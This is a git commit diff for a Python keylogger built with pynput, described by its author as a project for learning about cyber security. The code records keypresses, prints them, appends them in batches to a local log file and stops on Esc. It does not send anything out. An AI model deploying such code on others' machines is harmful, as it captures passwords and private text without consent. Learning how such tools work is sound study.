0d5d59dd245b0285c02d51b841ee253e8fe18d35
Giovanni Raso <126286036+GiovanniRaso@users.noreply.github.com>
2023-04-26 14:15:54 -0400

    Update key_logger.py

--- key_logger.py
+++ key_logger.py
@@ -1,24 +1,40 @@
-"""
+""""
 Author: Gio Raso
 Description: Making a key logger as a side project to help learn about cyber sercurity
 """
+import pynput
 
 from pynput import keyboard
+from pynput.keyboard import Key, Listener
 
-# open a file for key strockes
-with open('keyStrockes.txt', 'w') as f:
+count = 0
+keys = []
+
 
 def on_press(key):
-    try:
-        f.write('{0}'.format(key))
-    except AttributeError:
-        pass
+    global keys, count
+    keys.append(key)
+    count += 1
+    print('{0}'.format(key))
+
+    if count >= 5:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    with open("log.txt", "a") as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if k.find("space") > 0:
+                f.write(' ')
+            elif k.find("Key") == -1:
+                f.write(k)
+
 
 def on_release(key):
-    try:
-        f.write('{0}'.format(key))
-    except AttributeError:
-        pass
+    if key == Key.esc:
+        return False
 
 with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
     listener.join()
